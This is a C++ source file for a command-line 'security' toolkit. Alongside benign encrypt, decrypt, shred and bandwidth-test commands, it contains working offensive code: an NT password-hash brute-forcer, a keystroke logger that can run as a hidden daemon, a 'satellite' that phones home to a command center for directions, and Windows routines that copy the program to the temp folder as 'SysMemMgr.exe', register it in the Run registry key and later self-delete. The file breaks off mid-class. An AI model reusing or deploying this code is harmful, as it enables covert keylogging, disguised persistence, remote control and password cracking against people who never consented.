// -------------------------------------------------------------
// The contents of this file may be distributed under the CC0
// license (http://creativecommons.org/publicdomain/zero/1.0/).
// Of course you may also distribute it under a more restrictive
// license, such as any of the OSI-approved licenses
// (http://www.opensource.org/licenses).
// -------------------------------------------------------------

#include <stdio.h>
#include <stdlib.h>
#include <GClasses/GHttp.h>
#include <GClasses/GApp.h>
#include <GClasses/GBits.h>
#include <GClasses/GDirList.h>
#include <GClasses/GCrypto.h>
#include <GClasses/GError.h>
#include <GClasses/GHolders.h>
#include <GClasses/GRand.h>
#include <GClasses/GFile.h>
#include <GClasses/GTime.h>
#include <GClasses/GSocket.h>
#include "GKeyboard.h"
#include <time.h>
#include <iostream>
#include <string>
#include <set>
#ifdef WINDOWS
#	include <direct.h>
#	include <process.h>
#	include <io.h> // for "filelength"
#	include <GClasses/GWindows.h>
#	include <stdlib.h>
#	include <TCHAR.h>
#else
#	include <openssl/md4.h> // for md4 hash
#endif
#include <exception>
#include <fstream>
#include "../../../src/wizard/usage.h"
#include "satellite.h"
#include <math.h>
#include <sstream>
#include <fstream>

using namespace GClasses;
using std::cout;
using std::cin;
using std::cerr;
using std::vector;
using std::string;
using std::set;
using std::ostringstream;
using std::ofstream;

#define MY_PORT 1234
#define KILO 1024
#define KBYTES 8192
#define MESSAGESIZE KILO * KBYTES
#define SMALL_MESSAGE_SIZE 8

UsageNode* makeCryptoUsageTree()
{
	UsageNode* pRoot = new UsageNode("waffles_security [command]", "Various security-related tools.");
	UsageNode* pBWC = pRoot->add("bandwidthclient <options>", "Run a client program for measuring bandwidth.");
	{
		UsageNode* pOpts = pBWC->add("<options>");
		pOpts->add("-addr [address]", "Specify the address of the bandwidth server (which should already be running). The default address is \"localhost\"");
		pOpts->add("-port [n]", "Specify the port to connect to. The default is 3712.");
	}
	UsageNode* pBWS = pRoot->add("bandwidthserver <options>", "Run a server program for measuring bandwidth.");
	{
		UsageNode* pOpts = pBWS->add("<options>");
		pOpts->add("-port [n]", "Specify the port on which to listen. The default is 3712.");
	}
	UsageNode* pBFNP = pRoot->add("bruteforcentpassword [hash] <options>", "Try all combinations of passwords until it finds one with an NT hash that matches [hash]. (This feature does not yet build on Windows because I used libssl to supply the MD4 algorithm, and I have not yet bothered to find a Windows version of the libssl library. It would not take much effort to get it working on Windows, I just have not done it yet. This feature could also be easily modified to do other types of hashes, but I have not yet done that either.)");
	{
		pBFNP->add("[hash]", "The NT hash of the password you wish to find. The hash should consist of 32 hexadecimal digits.");
		UsageNode* pOpts = pBFNP->add("<options>");
		pOpts->add("-charset [string]", "Add the specified string of characters to the character set. (These are the characters it will use to form password combinations.) You can use other flags in conjunction with this one to form a character set.");
		pOpts->add("-numbers", "Add the numerical digits to the character set. This is the same as doing -charset 0123456789");
		pOpts->add("-lowercase", "Add the lowercase letters to the character set. This is the same as doing -charset abcdefghijklmnopqrstuvwxyz");
		pOpts->add("-uppercase", "Add the uppercase letters to the character set. This is the same as doing -charset ABCDEFGHIJKLMNOPQRSTUVWXYZ");
		pOpts->add("-sym1", "Adds space, comma, period, underscore, hyphen, apostrophe, and question mark to the character set.");
		pOpts->add("-sym2", "Adds these symbols to the character set: !@#$%^&*+=");
		pOpts->add("-sym3", "Adds these symbols to the character set: ()<>[]{}|\\;:~`\"/");
		pOpts->add("-startlen [n]", "Specify the starting password length. That is, don't try any passwords smaller than [n] characters.");
		pOpts->add("-part [n]", "Start on the specified part of the possible combinations of passwords. [n] should be a number from 0 to c-1, where c is the number of characters in the character set.");
		pOpts->add("-onepartonly", "Only do one part, and then exit. This option is useful for doing it in parallel, such that each parallel process does a different part.");
		pOpts->add("-stoponcollision", "Terminate when the first collision is found.");
		pOpts->add("-noprogress", "Do not display progress percentage. (It might be preferable not to display progress, for example, if you are going to pipe the output to a file.)");
	}
	UsageNode* pCC = pRoot->add("commandcenter <options>", "Run an inter-active command-center program that enables you to direct your satellites.");
	{
		UsageNode* pOpts = pCC->add("<options>");
		pOpts->add("-port [n]", "Specify the port to listen on. The default is 6831.");
	}
	UsageNode* pDecrypt = pRoot->add("decrypt [filename]", "Decrypt the specified file. (It will prompt you to enter the passphrase.)");
	{
		pDecrypt->add("[filename]", "The name of a file that was encrypted using the encrypt command.");
	}
	UsageNode* pEncrypt = pRoot->add("encrypt [path] <options>", "Encrypt [path] to create a single encrypted archive file. (It will prompt you to enter a passphrase.)");
	{
		pEncrypt->add("[path]", "A file name or a folder name. If it is a folder, then all of the contents recursively will be included.");
		UsageNode* pOpts = pEncrypt->add("<options>");
		pOpts->add("-out [filename]", "Specify the name of the output file. (The default is to use the name of the path with the extension changed to .encrypted.)");
		pOpts->add("-compress", "Take a lot longer, but produce a smaller encrypted archive file. (This feature really isn't very usable yet.)");
	}
	UsageNode* pLogKeys = pRoot->add("logkeys [filename] <options>", "Log key-strokes to the specified file. (The program will exit if the panic-sequence \"xqwertx\" is detected.)");
	{
		UsageNode* pOpts = pLogKeys->add("<options>");
		pOpts->add("-daemon", "Launch as a daemon. (Forks off a daemon that keeps running in the background and immediately exits.)");
	}
	pRoot->add("makegarbage", "Generates a bunch of 2GB files named garb#.tmp full of random garbage. It will keep generating them until you stop the program, or it crashes (perhaps due to the hard drive being full). The purpose of this tool is to fill the available areas of your hard drive so that previously deleted files will be more difficult to recover. When it is done, you can delete all the garb#.tmp files. This might also be useful for wiping a hard drive prior to discarding it.");
	pRoot->add("nthash [password]", "Computes the NT hash of [password]. (This feature does not yet build on Windows because I used libssl to supply the MD4 algorithm, and I have not yet bothered to find a Windows version of the libssl library. It would not take much effort to get it working on Windows, I just have not done it yet.)");
	pRoot->add("open [filename]", "A convenient interactive version of decrypt that prompts you to shred the files after you are done with them.");
	UsageNode* pSatellite = pRoot->add("satellite <options>", "Run a satellite program that periodically phones home to receive directions.");
	{
		UsageNode* pOpts = pSatellite->add("<options>");
		pOpts->add("-connectinterval [seconds]", "Specify the time in seconds between attempts to phone home. The default is 600 seconds");
		pOpts->add("-addr [address]", "Specify the address to phone home to. The default is 'localhost', which is only useful for testing purposes.");
		pOpts->add("-port [n]", "Specify the port to phone home to. The default is 6831.");
	}
	pRoot->add("shred [path]", "Writes over the file or folder (and its contents recursively) ONE time with random garbage, and then deletes it. On some file systems, this makes it very difficult to recover the file or folder. Please be aware that some filesystems (like those used on flash drives) write new data to a different location, so this will do no good (see the makegarbage tool). Also, forensic experts can often recover files that have been overwritten a small number of times. If you want your files to be truly unrecoverable, you need to use a more heavy-duty shredder.");
	pRoot->add("usage", "See the full usage information for this tool.");
	pRoot->add("wget [url] [filename]", "Download the file at [url] and save it to [filename].");
	return pRoot;
}

bool shredFile(const char* szFilename)
{
#ifdef WINDOWS
	char szTmp[4096];
	int i;
	for(i = 0; i < 4096; i++)
		szTmp[i] = rand() % 256;
	FILE* pFile = fopen(szFilename, "r+");
	if(!pFile)
		return false;
	FileHolder hFile(pFile);
	int nFileSize = filelength(fileno(pFile));
	while(nFileSize > 0)
	{
		fwrite(szTmp, 1, 4096, pFile);
		nFileSize -= 4096;
	}
	fflush(pFile);
	hFile.release();
	return DeleteFile(szFilename) ? true : false;
#else
	GTEMPBUF(char, szTmp, strlen(szFilename) + 32);
	strcpy(szTmp, "shred -fun1 ");
	strcat(szTmp, szFilename);
	bool bOK = (system(szTmp) == 0);
	return bOK;
#endif
}

bool shredFolder(const char* szPath)
{
	char* szOldDir = new char[300]; // use heap so deep recursion won't overflow stack
	ArrayHolder<char> hOldDir(szOldDir);
	if(!getcwd(szOldDir, 300))
		ThrowError("Failed to read current dir");

	// Recurse subdirs
	bool bOK = true;
	{
		if(chdir(szPath) != 0)
			return false;
		vector<string> folders;
		GFile::folderList(folders);
		for(vector<string>::iterator it = folders.begin(); it != folders.end(); it++)
		{
			const char* szDir = it->c_str();
			if(!shredFolder(szDir))
				bOK = false;
		}
	}

	// Delete files
	{
		vector<string> files;
		GFile::fileList(files);
		for(vector<string>::iterator it = files.begin(); it != files.end(); it++)
		{
			const char* szFile = it->c_str();
			if(!shredFile(szFile))
				bOK = false;
		}
	}

	if(chdir(szOldDir) != 0)
		ThrowError("Failed to restore the old dir");

	// todo: we should rename the directory before we delete it

#ifdef WINDOWS
	RemoveDirectory(szPath);
#else
	rmdir(szPath);
#endif
	return bOK;
}

void shred(const char* szPath)
{
	if(access(szPath, 0 ) != 0)
		ThrowError("The file or folder ", szPath, " does not seem to exist");
	struct stat status;
	stat(szPath, &status);
	if(status.st_mode & S_IFDIR)
		shredFolder(szPath);
	else
	{
		shredFile(szPath);

		// Also shred the temporary backup copy that many text editors make
		string s = szPath;
		s += "~";
		if(access(s.c_str(), 0) == 0)
			shredFile(s.c_str());
	}
}

void shred(GArgReader& args)
{
	shred(args.pop_string());
}

void makeGarbage(GArgReader& args)
{
	char buf[2048];
	unsigned long long* pBuf2 = (unsigned long long*)buf;
	size_t n = 0;
	while(true)
	{
		GRand prng(getpid() * time(NULL));
		ostringstream oss;
		oss << "garb";
		oss << n;
		oss << ".tmp";
		string sFilename = oss.str();
		ofstream ofs(sFilename.c_str());
		for(size_t i = 0; i < 1024 * 1024; i++)
		{
			unsigned long long* pTmp = pBuf2;
			for(size_t j = 0; j < 256; j++)
				*pTmp++ = prng.next();
			ofs.write(buf, 2048);
		}
		n++;
	}
}

#ifdef WINDOWS
HKEY GetRunKey()
{
	HKEY hSoftware;
	if(RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE", 0, KEY_ALL_ACCESS, &hSoftware) != ERROR_SUCCESS)
		ThrowError("Failed to open SOFTWARE registry key");
	HKEY hMicrosoft;
	if(RegOpenKeyEx(hSoftware, "Microsoft", 0, KEY_ALL_ACCESS, &hMicrosoft) != ERROR_SUCCESS)
		ThrowError("Failed to open Microsoft registry key");
	HKEY hWindows;
	if(RegOpenKeyEx(hMicrosoft, "Windows", 0, KEY_ALL_ACCESS, &hWindows) != ERROR_SUCCESS)
		ThrowError("Failed to open Windows registry key");
	HKEY hCurrentVersion;
	if(RegOpenKeyEx(hWindows, "CurrentVersion", 0, KEY_ALL_ACCESS, &hCurrentVersion) != ERROR_SUCCESS)
		ThrowError("Failed to open CurrentVersion registry key");
	HKEY hRun;
	if(RegOpenKeyEx(hCurrentVersion, "Run", 0, KEY_ALL_ACCESS, &hRun) != ERROR_SUCCESS)
		ThrowError("Failed to open Run registry key");
	
	return hRun;
}

void InstallInRunFolder(const char* szName, const char* szPath)
{
	if(RegSetValueEx(GetRunKey(), szName, 0, REG_SZ, (const unsigned char*)szPath, strlen(szPath) + 1) != ERROR_SUCCESS)
		ThrowError("Failed to set registry value");
}

void RemoveFromRunFolder(const char* szName)
{
	if(RegDeleteValue(GetRunKey(), szName) != ERROR_SUCCESS)
		ThrowError("Failed to set registry value");
}

void InstallOnWindowsAndLaunch()
{
	// Get the current filename
	char szAppPath[512];
	GetModuleFileName(NULL, szAppPath, 512);
	
	// Get a new filename
	char newPath[512];
	GetTempPath(512, newPath);
	newPath[256] = '\0';
	int len = strlen(newPath);
	if(len > 0 && newPath[len - 1] != '\\' && newPath[len - 1] != '/')
	{
		strcpy(newPath + len, "/");
		len++;
	}
	strcpy(newPath + len, "SysMemMgr.exe");
	
	// Copy the file
	if(GFile::doesFileExist(newPath))
	{
		if(!DeleteFile(newPath))
			exit(0);
	}
	if(!GFile::copyFile(szAppPath, newPath))
		cout << "The application failed to start\n";
	
	// Install in the registry
	strcat(newPath + len, " q9f24m3");
	InstallInRunFolder("SysMemMgr", newPath);
	GApp::systemExecute(newPath, false, NULL, NULL);
	GThread::sleep(900);
	exit(0);
}


void UninstallFromWindows()
{
	// Remove from registry
	RemoveFromRunFolder("SysMemMgr");
	
	// Create a self-destruct batch file
	char szAppPath[512];
	GetModuleFileName(NULL, szAppPath, 512);
	int j = -1;
	int i;
	for(i = 0; szAppPath[i] != '\0'; i++)
	{
		if(szAppPath[i] == '/' || szAppPath[i] == '\\')
			j = i;
	}
	if(j > -1)
	{
		szAppPath[j + 1] = '\0';
		chdir(szAppPath);
		strcpy(szAppPath + j + 1, "sd.bat");
		FILE* pFile = fopen(szAppPath, "w");
		fputs("@ping 127.0.0.1 -n 3 -w 1000 > nul\n", pFile); // wait six seconds
		fputs("@del /f /q %1% > nul\n", pFile); // delete the specified file
		fputs("@del /f /q %0% > nul\n", pFile); // delete itself
		fclose(pFile);
	
		// Run the batch file
		strcat(szAppPath + j, " SysMemMgr.exe");
		GApp::systemCall(szAppPath, false, false);
	}
	else
	{
	}
	
	exit(0);
}
#else

#endif // !WINDOWS

int doBandwidthClient(GArgReader& args)
{
	int port = 3712;
	const char* szUrl = "localhost";
	while(args.next_is_flag())
	{
		if(args.if_pop("-port"))
			port = args.pop_uint();
		else if(args.if_pop("-addr"))
			szUrl = args.pop_string();
		else
			ThrowError("Invalid option: ", args.peek());
	}

	// Fill an 8-MB buffer with random data
	unsigned char* pBuf = new unsigned char[MESSAGESIZE];
	ArrayHolder<unsigned char> hBuf(pBuf);
	GRand r(0);
	unsigned int* pU = (unsigned int*)pBuf;
	for(unsigned int i = 0; i < MESSAGESIZE / sizeof(unsigned int); i++)
		*(pU++) = (unsigned int)r.next();

	// Make a ClientSocket
	cout << "Connecting to server...\n";
	GPackageClient socket;
	double dStart = GTime::seconds();
	socket.connect(szUrl, port);
	double dFinish = GTime::seconds();
	cout << "Connecting time = " << dFinish - dStart << "\n";

	// Measure latency
	cout << "Measuring latency...\n";
	double dLatency = 0;
	for(int i = 0; i < 9; i++)
	{
		// Send a small message
		dStart = GTime::seconds();
		socket.send((const char*)pBuf, SMALL_MESSAGE_SIZE);

		// Wait for a reply
		cout << "Waiting for the reply...\n";
		char* pMessage;
		size_t nSize;
		while(true)
		{
			pMessage = socket.receive(&nSize);
			if(pMessage)
				break;
#ifdef WINDOWS
			GWindows::yield();
#endif
			GThread::sleep(0);
		}
		dFinish = GTime::seconds();
		if(i > 0)
			dLatency += (dFinish - dStart);
	}
	dLatency /= 16;
	cout << "Latency: " << dLatency << "\n";

	// Send a big message
	cout << "Sending an 8MB message (to measure bandwidth)...\n";
	dStart = GTime::seconds();
	socket.send((const char*)pBuf, MESSAGESIZE);

	// Wait for a reply
	cout << "Waiting for the server to send it back...\n";
	char* pMessage;
	size_t nSize;
	while(true)
	{
		pMessage = socket.receive(&nSize);
		if(pMessage)
			break;
#ifdef WINDOWS
		GWindows::yield();
#endif
		GThread::sleep(0);
	}
	dFinish = GTime::seconds();

	// Check the message
	if(nSize != MESSAGESIZE)
		ThrowError("The reply is the wrong size--something's wrong\n");
	if(memcmp(pMessage, pBuf, MESSAGESIZE))
		cout << "!!!The message differs from the original--something's wrong!!!\n";

	cout << "Roundtrip time: " << dFinish - dStart << "\n";
	cout << "Bandwidth: " << (((double)MESSAGESIZE * 8 * 2) / ((dFinish - dStart) - 2.0 * dLatency)) / 1000000 << "\n";
	cout << "Bandwidth: " << (((double)MESSAGESIZE * 2) / ((dFinish - dStart) - 2.0 * dLatency)) / 1000000 << "\n";
	cout << "Bandwidth: " << (((double)MESSAGESIZE * 2) / ((dFinish - dStart) - 2.0 * dLatency)) / (1024 * 1024) << "\n";
	return 0;
}

int doBandwidthServer(GArgReader& args)
{
	// Parse args
	int port = 3712;
	while(args.next_is_flag())
	{
		if(args.if_pop("-port"))
			port = args.pop_uint();
		else
			ThrowError("Invalid option: ", args.peek());
	}

	// Repeat messages
	GPackageServer socket(port);
	cout << "waiting for a client program to connect...\n";
	while(true)
	{
		size_t nSize;
		GTCPConnection* pConn;
		char* pMessage = socket.receive(&nSize, &pConn);
		if(pMessage)
		{
			// Get the message
			cout << "Got a message.  Sending it back...\n";
			socket.send((const char*)pMessage, nSize, pConn);
			cout << "Message sent.\n";
			cout << "Waiting for another client to connect...\n";
		}

                // Let Windows have a chance to pump messages through
#ifdef WINDOWS
		GWindows::yield();
		Sleep(0);
#endif
	}
	return 0;
}



void nthash(const char* password, unsigned char* hash)
{
#ifdef WINDOWS
	ThrowError("Sorry, this feature is not yet implemented for Windows. (It works on Linux.)");
#else
	unsigned short buf[128];
	unsigned int len = 0;
	for(unsigned short* pBuf = buf ; *password != '\0'; password++)
	{
		*pBuf = htons((unsigned int)*password << 8);
		pBuf++;
		len++;
	}
	MD4_CTX ctx;
	MD4_Init(&ctx);
	MD4_Update(&ctx, buf, len * sizeof(unsigned short));
	MD4_Final(hash, &ctx);
#endif
}

void bruteForceNTPassword(size_t passwordLen, unsigned char* hash, const char* charSet, size_t part, bool onePartOnly, bool stopOnCollision, bool showProgress)
{
	unsigned char candHash[16];
	if(passwordLen == 0)
	{
		nthash("", candHash);
		if(*(size_t*)candHash == *(size_t*)hash && memcmp(candHash, hash, 16) == 0)
		{
			cout << "\r                        \rFound a collision: <empty password>\n";
			cout.flush();
		}
		if(stopOnCollision)
			return;
	}
	cout.precision(8);
	GTEMPBUF(const char*, pChars, passwordLen);
	GTEMPBUF(char, cand, passwordLen + 1);
	cand[passwordLen] = '\0';
	for(size_t i = 0; i < passwordLen; i++)
	{
		pChars[i] = charSet;
		cand[i] = *pChars[i];
	}
	size_t charSetLen = strlen(charSet);
	size_t termLen = passwordLen - 1;
	if(part >= charSetLen)
		ThrowError("Part ", to_str(part), " is out of range. It should be from 0 to ", to_str(charSetLen - 1));
	pChars[passwordLen - 1] += part;
	cand[passwordLen - 1] = *pChars[passwordLen - 1];
	if(termLen > 0 && onePartOnly)
		termLen--; // only do one part
	size_t n = 1;
	while(true)
	{
		// Try the candidate password
		nthash(cand, candHash);
		if(*(size_t*)candHash == *(size_t*)hash && memcmp(candHash, hash, 16) == 0)
		{
			cout << "\r                        \rFound a collision: " << cand << "\n";
			cout.flush();
			if(stopOnCollision)
				return;
		}

		// Advance
		for(size_t i = 0; i < passwordLen; i++)
		{
			pChars[i]++;
			cand[i] = *pChars[i];
			if(*pChars[i] == '\0')
			{
				pChars[i] = charSet;
				if(i == termLen)
				{
					cout << "\r                        \r";
					return; // All done
				}
			}
			else
				break;
		}

		// Display progress
		if(showProgress && --n == 0)
		{
			n = 2000000; // how frequently to display progress
			size_t den = charSetLen;
			size_t num = 0;
			for(size_t i = termLen; i < passwordLen; i--)
			{
				num += (pChars[i] - charSet);
				if(den >= 10000000) // don't overrun the precision of our registers
					break;
				den *= charSetLen;
				num *= charSetLen;
			}
			double prog = (double)num * 100 / den; // convert to a percentage
			cout << "\r                                    \r" << prog << "% (part " << (pChars[passwordLen - 1] - charSet) << "/" << charSetLen << ")";
			cout.flush();
		}
	}
}

void bruteForceNTPassword(GArgReader& args)
{
	const char* szHashHex = args.pop_string();
	if(strlen(szHashHex) != 32)
		ThrowError("Expected the hash to consist of 32 hexadecimal digits");
	unsigned char hash[16];
	GBits::hexToBufferBigEndian(szHashHex, 32, hash);
	string charset = "";
	size_t startLen = 0;
	size_t part = 0;
	bool onePartOnly = false;
	bool stopOnCollision = false;
	bool showProgress = true;
	while(args.next_is_flag())
	{
		if(args.if_pop("-charset"))
			charset += args.pop_string();
		else if(args.if_pop("-numbers"))
			charset += "0123456789";
		else if(args.if_pop("-lowercase"))
			charset += "abcdefghijklmnopqrstuvwxyz";
		else if(args.if_pop("-uppercase"))
			charset += "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
		else if(args.if_pop("-sym1"))
			charset += " ,._-'?";
		else if(args.if_pop("-sym2"))
			charset += "+=!@#$%^&*";
		else if(args.if_pop("-sym3"))
			charset += "()<>[]{}|\\;:~`\"/";
		else if(args.if_pop("-startlen"))
			startLen = args.pop_uint();
		else if(args.if_pop("-part"))
			part = args.pop_uint();
		else if(args.if_pop("-onepartonly"))
			onePartOnly = true;
		else if(args.if_pop("-stoponcollision"))
			stopOnCollision = true;
		else if(args.if_pop("-noprogress"))
			showProgress = false;
		else
			ThrowError("Invalid option: ", args.peek());
	}

	// Remove dupes
	{
		set<char> cs;
		for(size_t i = charset.length() - 1; i < charset.length(); i--)
		{
			if(cs.find(charset[i]) == cs.end())
				cs.insert(charset[i]);
			else
				charset.erase(i);
		}
	}
	if(charset.length() == 0)
		charset += "abcdefghijklmnopqrstuvwxyz0123456789";

	cout << "Character set: " << charset << "\n";
	if(onePartOnly)
		bruteForceNTPassword(startLen, hash, charset.c_str(), part, onePartOnly, stopOnCollision, showProgress);
	else
	{
		size_t len = startLen;
		while(true)
		{
			cout << "Trying passwords of length " << len << ":\n";
			cout.flush();
			bruteForceNTPassword(len++, hash, charset.c_str(), part, onePartOnly, stopOnCollision, showProgress);
		}
	}
}

void nthash(GArgReader& args)
{
	unsigned char hash[16];
	nthash(args.pop_string(), hash);
	char hex[33];
	GBits::bufferToHexBigEndian(hash, 16, hex);
	hex[32] = '\0';
	cout << hex << "\n";
}

const char* g_szMagicCombo = "xqwertx";
#define MAGIC_LEN 7

class KeystrokeSniffer
{
protected:
	GKeyboard* m_pKeyboard;
	FILE* m_pLogFile;
	int m_nMagicPos;

public:
	KeystrokeSniffer(const char* szFilename)
	{
		m_nMagicPos = 0;
		m_pLogFile = fopen(szFilename, "a");
		if(!m_pLogFile)
			throw "Failed to open log file\n";
		char buf[64];
		fprintf(m_pLogFile, "\n== Begin at %s ==\n", GTime::asciiTime(buf, 64, false));
		m_pKeyboard = new GKeyboard(KeyStrokeHandler, this);
	}

	~KeystrokeSniffer()
	{
		delete(m_pKeyboard);
		char buf[64];
		fprintf(m_pLogFile, "\n== End at %s ==\n", GTime::asciiTime(buf, 64, false));
		fclose(m_pLogFile);
	}

	static void KeyStrokeHandler(void* pThis, char c)
	{
		((KeystrokeSniffer*)pThis)->OnKeyStroke(c);
	}

	void Watch()
	{
		m_pKeyboard->Watch();
	}

	void Stop()
	{
		m_pKeyboard->Stop();
	}

	void OnKeyStroke(char c)
	{
		fputc(c, m_pLogFile);
		if(rand() % 100 == 0)
			fflush(m_pLogFile);
		if(c == g_szMagicCombo[m_nMagicPos])
		{
			if(++m_nMagicPos >= MAGIC_LEN)
				Stop();
		}
		else
			m_nMagicPos = 0;
	}

	static void doLogging(void* filename)
	{
		const char* szFilename = (const char*)filename;
		try
		{
			KeystrokeSniffer ks(szFilename);
			ks.Watch();
		}
		catch(std::exception&)
		{
//			fprintf(stderr, e.what());
		}
	}

	static void logKeyStrokes(GArgReader& args)
	{
		const char* szFilename = args.pop_string();
		bool daemon = false;
		while(args.next_is_flag())
		{
			if(args.if_pop("-daemon"))
				daemon = true;
			else
				ThrowError("Invalid option: ", args.peek());
		}
		if(daemon)
			GApp::launchDaemon(doLogging, (void*)szFilename);
		else
			doLogging((void*)szFilename);
	}
};




unsigned char* downloadFromWeb(const char* szAddr, size_t timeout, size_t* pOutSize)
{
	GHttpClient client;
	if(!client.get(szAddr, true))
		ThrowError("Error connecting");
	float fProgress;
	time_t start = time(NULL);
	while(client.status(&fProgress) == GHttpClient::Downloading)
	{
		if((size_t)(time(NULL) - start) > timeout)
			break;
		GThread::sleep(50);
	}
	if(client.status(&fProgress) != GHttpClient::Done)
		ThrowError("Error downloading page");
	return client.releaseData(pOutSize);
}

int wget(GArgReader& args)
{
	const char* url = args.pop_string();
	const char* filename = args.pop_string();
	size_t size;
	char* pFile = (char*)downloadFromWeb(url, 20, &size);
	ArrayHolder<char> hFile(pFile);
	GFile::saveFile(pFile, size, filename);
	return 0;
}

void doCommandCenter(GArgReader& args)
{
	int port = 6831;
	while(args.next_is_flag())
	{
		if(args.if_pop("-port"))
			port = args.pop_uint();
		else
			ThrowError("Invalid option: ", args.peek());
	}
	doShellCommandCenter(port);
}

int doSatellite(GArgReader& args)
{
	const char* szAddr = "localhost";
	int connectInterval = 60 * 10;
	int timeoutSecs = 120;
	int port = 6831;
	while(args.next_is_flag())
	{
		if(args.if_pop("-connectinterval"))
			connectInterval = args.pop_uint();
		else if(args.if_pop("-addr"))
			szAddr = args.pop_string();
		else if(args.if_pop("-port"))
			port = args.pop_uint();
		else
			ThrowError("Invalid option: ", args.peek());
	}
        Satellite sat;
        sat.Go(szAddr, port, connectInterval, timeoutSecs);
        return 0;
}
/*
int doLogin(GArgReader& args)
{
	LoginController c;
	c.RunModal();
	return 0;
}
*/

#define MAX_PASSPHRASE_LEN 1024
#define SALT_LEN 32

void readInPassphrase(char* pBuf, size_t len, char* pSalt = NULL)
{
	cout << "Please enter the passphrase: ";
	cout.flush();
	GPassiveConsole pc(false);
	while(true)
	{
		char c = pc.getChar();
		if(c != '\0')
		{
			if(c == '\r' || c == '\n')
				break;
			if(len > 1)
			{
				*pBuf = c;
				pBuf++;
				len--;
			}
		}
		else
			GThread::sleep(10);
	}
	*pBuf = '\0';
	cout << "\r                                                   \r";
	cout.flush();

	// Read the salt
	if(pSalt)
	{
		size_t remaining = SALT_LEN;
		cout << "\rPlease enter " << remaining << " chars of salt";
		cout.flush();
		GPassiveConsole pc(false);
		while(remaining > 0)
		{
			char c = pc.getChar();
			if(c != '\0')
			{
				remaining--;
				pSalt[remaining] = c;
				cout << "\rPlease enter " << remaining << " chars of throw-away salt";
				cout.flush();
			}
			else
				GThread::sleep(10);
		}
		cout << "\r                                                   \r";
		cout.flush();
	}
}

void appendSalt(char* passphrase, const char* salt)
{
	size_t len = strlen(passphrase);
	size_t sl = std::min((unsigned int)(MAX_PASSPHRASE_LEN - 1 - len), (unsigned int)SALT_LEN);
	memcpy(passphrase + len, salt, sl);
	passphrase[len + sl] = '\0';
}

#define DECRYPT_BLOCK_SIZE 2048

void decryptFile(const char* source, char* passphrase, char* outSalt, std::string* pBaseName)
{
	// Open the file and measure its length
	std::ifstream ifs;
	ifs.exceptions(std::ios::failbit|std::ios::badbit);
	ifs.open(source, std::ios::binary);
	ifs.seekg(0, std::ios::end);
	size_t len = ifs.tellg();
	ifs.seekg(0, std::ios::beg);

	// Read the salt
	ifs.read(outSalt, SALT_LEN);
	len -= SALT_LEN;
	appendSalt(passphrase, outSalt);

	// Decrypt it
	size_t origLen = len;
	size_t prevLen = len;
	GFolderDeserializer fd(pBaseName);
	GCrypto crypto(passphrase, strlen(passphrase));
	char* pBuf = new char[DECRYPT_BLOCK_SIZE];
	ArrayHolder<char> hBuf(pBuf);
	bool first = true;
	while(len > 0)
	{
		size_t chunkSize = std::min(len, (size_t)DECRYPT_BLOCK_SIZE);
		ifs.read(pBuf, chunkSize);
		len -= chunkSize;
		crypto.doChunk(pBuf, chunkSize);
		if(first)
		{
			first = false;
			if(memcmp(pBuf, "ugfs", 4) != 0 && memcmp(pBuf, "cgfs", 4) != 0)
				ThrowError("The passphrase is incorrect");
		}
		fd.doNext(pBuf, chunkSize);
		if(prevLen - len >= 10000)
		{
			cout << "      \r" << (0.01 * floor(float(origLen - len) * 10000 / origLen)) << "%";
			cout.flush();
			prevLen = len;
		}
	}
	cout << "\rDone.          \n";
}

class PassphraseWiper
{
public:
	char* m_pBuf;
	PassphraseWiper(char* pBuf) : m_pBuf(pBuf) {}
	~PassphraseWiper()
	{
		memset(m_pBuf, '\0', MAX_PASSPHRASE_LEN);
	}
};

void decrypt(GArgReader& args)
{
	const char* filename = args.pop_string();
	char passphrase[MAX_PASSPHRASE_LEN];
	readInPassphrase(passphrase, MAX_PASSPHRASE_LEN);
	PassphraseWiper pw(passphrase);
	char salt[SALT_LEN];
	decryptFile(filename, passphrase, salt, NULL);
}

void encryptPath(const char* pathName, char* passphrase, const char* targetName, bool compress)
{
	// Encrypt the path
	GFolderSerializer fs(pathName, compress);
	GCrypto crypto(passphrase, strlen(passphrase));
	std::ofstream ofs;
	ofs.exceptions(std::ios::failbit|std::ios::badbit);
	ofs.open(targetName, std::ios::binary);
	
	// Write the salt
	ofs.write(passphrase + strlen(passphrase) - SALT_LEN, SALT_LEN);

	size_t prevProg = 0;
	while(true)
	{
		size_t len;
		char* chunk = fs.next(&len);
		if(!chunk)
			break;
		crypto.doChunk(chunk, len);
		try
		{
			ofs.write(chunk, len);
			size_t prog = fs.bytesOut();
			if(prog >= prevProg + 100000)
			{
				cout << "          \r" << 0.01 * floor((float)prog * 0.0001) << "MB";
				cout.flush();
			}
		}
		catch(const std::exception&)
		{
			ThrowError("Error writing to file ", targetName);
		}
	}
	cout << "\rDone.               \n";
}

void encrypt(GArgReader& args)
{
	// Get the source path
	const char* pathName = args.pop_string();

	// Options
	string sPath = pathName;
	if(sPath.length() > 0 && (sPath[sPath.length() - 1] == '/' || sPath[sPath.length() - 1] == '\\'))
		sPath.erase(sPath.length() - 1);
	PathData pd;
	GFile::parsePath(sPath.c_str(), &pd);
	string sTarget;
	sTarget.assign(pathName + pd.fileStart, pd.extStart - pd.fileStart);
	sTarget.append(".encrypted");
	bool compress = false;
	while(args.next_is_flag())
	{
		if(args.if_pop("-out"))
			sTarget = args.pop_string();
		else if(args.if_pop("-compress"))
			compress = true;
		else
			ThrowError("Invalid option: ", args.peek());
	}
	char passphrase[MAX_PASSPHRASE_LEN];
	char salt[SALT_LEN];
	readInPassphrase(passphrase, MAX_PASSPHRASE_LEN, salt);
	PassphraseWiper pw(passphrase);
	appendSalt(passphrase, salt);
	encryptPath(pathName, passphrase, sTarget.c_str(), compress);
}

#ifdef WINDOWS
// Iterate the top-level windows. Encapsulates ::EnumWindows.
class CWindowIterator {
protected:
   HWND* m_hwnds;          // array of hwnds for this PID
   DWORD m_nAlloc;         // size of array
   DWORD m_count;          // number of HWNDs found
   DWORD m_current;        // current HWND
   static BOOL CALLBACK EnumProc(HWND hwnd, LPARAM lp);
   // virtual enumerator
   virtual BOOL OnEnumProc(HWND hwnd);
   // override to filter different kinds of windows
   virtual BOOL OnWindow(HWND hwnd) {return TRUE;}
public:
   CWindowIterator(DWORD nAlloc=1024);
   ~CWindowIterator();

   DWORD GetCount() { return m_count; }
   HWND First();
   HWND Next() {
      return m_hwnds && m_current < m_count ? m_hwnds[m_current++] : NULL;
   }
};

